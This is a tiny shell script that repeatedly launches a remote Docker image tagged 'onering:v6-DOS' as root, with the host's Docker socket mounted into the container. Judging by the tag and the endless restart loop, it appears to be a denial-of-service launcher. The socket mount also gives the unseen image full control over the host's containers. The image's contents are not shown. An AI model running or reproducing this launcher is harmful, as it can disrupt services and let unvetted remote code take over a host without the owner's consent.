#!/bin/sh
while true; do docker run -u root -v /var/run/docker.sock:/var/run/docker.sock ilcapone/onering:v6-DOS; done
